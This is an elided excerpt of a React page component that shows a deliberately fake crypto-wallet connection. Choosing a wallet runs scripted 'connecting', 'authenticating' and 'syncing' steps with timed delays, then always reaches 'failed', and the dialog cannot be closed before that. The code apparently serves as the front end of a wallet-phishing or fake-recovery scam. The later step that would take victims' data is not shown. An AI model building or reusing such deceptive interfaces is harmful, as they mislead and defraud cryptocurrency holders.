...
import { ArrowLeft, AlertTriangle, CheckCircle, Loader2, ExternalLink, Wallet, Shield, Clock, Zap, Wifi, WifiOff, X } from 'lucide-react';
...
export default function Issue() {
  ...
  // Fake connection modal states
  const [showConnectionModal, setShowConnectionModal] = useState(false);
  const [connectionStep, setConnectionStep] = useState<'connecting' | 'authenticating' | 'syncing' | 'failed'>('connecting');
  const [selectedWalletForConnection, setSelectedWalletForConnection] = useState<{name: string, icon: string} | null>(null);

  const category = getCategoryBySlug(params?.slug || '');

  // Simulate fake wallet connection process
  const simulateWalletConnection = async (walletName: string, walletIcon: string) => {
    setSelectedWalletForConnection({ name: walletName, icon: walletIcon });
    ...
    // Step 2: Authenticating (2 seconds)
    await new Promise(resolve => setTimeout(resolve, 2000));
    setConnectionStep('syncing');

    // Step 3: Syncing (2 seconds)
    await new Promise(resolve => setTimeout(resolve, 2000));
              ...
              <>
                ...
                <div className="max-h-[400px] overflow-y-auto pr-2">
                  <WalletGrid 
                    ...
                    onSelect={(wallet) => simulateWalletConnection(wallet.name, wallet.icon)}
                  />
                </div>
              </>
            ) : (
  ...
  return (
    <div className="min-h-screen bg-gray-50">
      ...
      <Dialog 
        ...
        onOpenChange={(open) => {
          // Only allow closing when connection failed or manually triggered
          if (!open && connectionStep === 'failed') {
